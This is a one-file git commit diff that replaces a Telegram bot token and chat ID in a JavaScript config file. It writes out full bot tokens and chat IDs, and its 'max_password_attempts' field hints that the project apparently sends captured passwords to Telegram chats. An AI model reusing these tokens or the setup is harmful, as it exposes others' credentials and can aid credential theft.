7abb2853557174feb5afcd983b1f390a66e479c4
trolltaodi1234 <trolltaodi1234@gmail.com>
2025-09-10 22:29:38 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,6 +1,6 @@
 const config = {
-    token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
-    chat_id: '1662565121',
+    token: '7904236127:AAGl1BF9xsGS3yNjMvMTnVUrqP68Cccqbv8',
+    chat_id: '5195906026',
     noti_token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
     noti_chat_id: '-4741680886',
     max_password_attempts: 2,
